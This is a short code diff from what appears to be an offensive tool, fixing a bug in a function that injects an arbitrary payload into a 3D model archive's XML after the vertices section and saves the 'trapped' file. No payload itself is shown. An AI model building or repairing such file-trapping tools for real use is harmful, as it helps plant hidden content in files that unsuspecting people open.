@@ -102,12 +102,12 @@ def threedeeInject(archive, payload):
 
                         if trap_location != -1:
                             trapped_xml = model_xml[:trap_location + len('</vertices>')] + payload + model_xml[trap_location + len('</vertices>'):]
-                            trapped_xml = (trapped_xml.encode('utf-8'))
+                            File_Content = (trapped_xml.encode('utf-8'))
                             FancyPrint("The light is green, the TRAP is clean", Fore.GREEN)
                         else:
                             FancyPrint("Could not find 'Vertices' section",Fore.RED)
                     
-                    New_Zip.writestr(file,trapped_xml)
+                    New_Zip.writestr(file,File_Content)
 
             Source_Zip.close
 
